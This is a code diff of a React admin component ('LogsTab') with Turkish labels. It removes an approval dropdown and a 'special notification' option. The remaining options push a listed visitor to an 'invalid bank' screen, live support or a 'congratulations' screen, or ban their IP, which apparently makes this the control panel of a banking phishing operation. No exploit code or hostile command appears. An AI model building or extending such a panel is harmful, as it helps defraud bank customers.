@@ -1139,26 +1139,7 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                           <option value="invalid_bank">❌ Hatalı Banka (Uyarı)</option>
                           <option value="live_support">🎧 Canlı Desteğe Yönlendir</option>
                           <option value="congrats">✅ Tebrikler Ekranına Al</option>
-                          <option value="special_approval">🔔 Özel Bildirim Gönder</option>
                           <option value="ban_ip">🚫 IP Banla (Siteye Giremesin)</option>
-                        </select>
-
-                        <select
-                          className={`w-full rounded-lg border px-2 py-1.5 text-[10px] outline-none cursor-pointer font-medium transition-all focus:ring-2 focus:ring-emerald-500/40 ${darkMode ? 'bg-[#1c1c1e] border-white/10 text-white' : 'bg-gray-50 border-gray-200 text-gray-900'}`}
-                          value=""
-                          onChange={(e) => {
-                            if (e.target.value) {
-                              void handleApprovalAction(row.id, e.target.value);
-                              e.target.value = "";
-                            }
-                          }}
-                        >
-                          <option value="">Onay Seçin...</option>
-                          {APPROVAL_OPTIONS.map((option) => (
-                            <option key={option.value} value={option.value}>
-                              {option.label}
-                            </option>
-                          ))}
                         </select>
 
                         <div className="flex justify-end items-center mt-0.5 gap-1 w-full">
